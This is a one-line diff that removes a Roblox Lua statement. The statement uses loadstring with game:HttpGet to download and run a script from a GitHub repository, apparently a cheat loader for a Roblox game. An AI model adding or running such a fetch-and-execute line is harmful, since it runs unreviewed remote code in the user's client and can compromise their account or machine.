@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WackyWorId/XCU-BABFT/main/Main.lua"))()
